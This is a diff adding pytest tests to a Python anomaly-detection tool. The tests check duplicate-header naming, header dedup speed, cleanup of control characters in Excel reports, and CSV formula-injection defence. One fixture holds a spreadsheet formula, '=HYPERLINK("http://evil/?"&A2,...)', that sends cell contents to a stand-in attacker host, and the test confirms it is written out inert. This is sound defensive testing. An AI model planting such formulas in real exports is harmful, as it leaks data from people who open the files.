@@ -1156,3 +1156,72 @@ def test_the_cross_column_score_refuses_a_blank_or_infinite_value():
         x[3, 0] = bad
         with pytest.raises(ValueError):
             _ecod(x)
+
+
+def _named_as_before_ah160(columns, alias, first):
+    """The loop load_from_records and powerbi._header used before AH-160: the reference for the names they give."""
+    out = []
+    for c in columns:
+        name, k = c, first
+        while name in out:
+            name, k = alias(c, k), k + 1
+        out.append(name)
+    return out
+
+
+def test_duplicate_headers_keep_the_names_they_always_had():
+    from anomaly_hunter import powerbi
+    from anomaly_hunter.engine.load import load_from_records
+    cols = ["a", "a", "a.1", "a", "b", "a.2", "a", 2024, "2024", "b.1", "b", "b", "a.1"]
+    df, _, _ = load_from_records(cols, [list(range(len(cols)))])
+    assert list(df.columns) == _named_as_before_ah160(list(map(str, cols)), lambda c, k: f"{c}.{k}", 1) == [
+        "a", "a.1", "a.1.1", "a.2", "b", "a.2.1", "a.3", "2024", "2024.1", "b.1", "b.2", "b.3", "a.1.2"]
+    head = ["x\ny", "x\ry", "x↵y", "x↵y 2", "Severity", "x\r\ny", "Severity"]
+    assert powerbi._header(head)[1:-6] == _named_as_before_ah160([powerbi.text(c) for c in head], lambda c, k: f"{c} {k}", 2) == [
+        "x↵y", "x↵y 2", "x↵y 3", "x↵y 2 2", "Severity", "x↵y 4", "Severity 2"]
+
+
+def test_sixteen_thousand_identical_headers_are_named_in_a_moment():
+    # AH-160: each repeat searched its free name from ".1" again, in a list: 2,000 identical headers took 10 s and
+    # 16,384 (the column cap) about 85 minutes of CPU for one request; in the Power BI header, under its lock
+    import time
+    from anomaly_hunter import powerbi
+    from anomaly_hunter.engine.load import unique
+    t = time.perf_counter()
+    assert unique(["a"] * 16_384, lambda c, k: f"{c}.{k}", 1)[-1] == "a.16383"
+    assert powerbi._header(["a"] * 16_384)[-7] == "a 16384"
+    assert time.perf_counter() - t < 2
+
+
+def test_each_repeated_header_goes_on_from_the_last_name_given_to_it():
+    from anomaly_hunter.engine.load import unique
+    tried = []
+    names = unique(["a"] * 2000, lambda c, k: tried.append(k) or f"{c}.{k}", 1)
+    assert names == ["a", *(f"a.{k}" for k in range(1, 2000))]
+    assert len(tried) == 1999  # one free name tried per repeat, never every taken one again
+
+
+def test_a_header_that_looks_like_a_formula_is_written_inert_in_limits_csv_and_read_back(tmp_path):
+    # AH-160: the CLI tells the user to open limits.csv, and a header "=HYPERLINK(...)" was written there live
+    evil = '=HYPERLINK("http://evil/?"&A2,"x")'
+    df = pd.DataFrame({evil: [float(v) for v in range(1, 41)], "Amount": [100.0 + v % 7 for v in range(40)]})
+    limits_path = tmp_path / "limits.csv"
+    suggest_limits(df, [evil, "Amount"], limits_path)
+    with open(limits_path, newline="", encoding="utf-8") as f:
+        assert [r[0] for r in csv.reader(f)][1:] == ["'" + evil, "Amount"]
+    limits, warnings = read_limits(limits_path, {evil: "number", "Amount": "number"})
+    assert set(limits) == {evil, "Amount"} and warnings == []  # the user's limits still reach their column
+
+
+def test_a_control_character_in_a_cell_is_written_to_the_report_as_a_question_mark(tmp_path):
+    # AH-160: openpyxl refuses "\x07" (no XML character), and the whole report was a traceback
+    csv_path = tmp_path / "bell.csv"
+    make_clean_csv(csv_path, n=40)
+    with open(csv_path, "a", encoding="utf-8") as f:
+        f.write('41,"1\x07",50\n')  # text in a number column: its reason quotes it, on the Reason cell and its note
+    limits_path, out_path = tmp_path / "limits.csv", tmp_path / "report.xlsx"
+    run_scan([str(csv_path)], str(limits_path), None, str(out_path))
+    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0
+    wb = load_workbook(out_path)
+    said = [c for ws in wb for row in ws.iter_rows() for c in row if c.value == 'Text "1?" in number column Amount']
+    assert len(said) == 2 and said[0].comment.text == said[0].value  # Data (with its note) and Anomalies
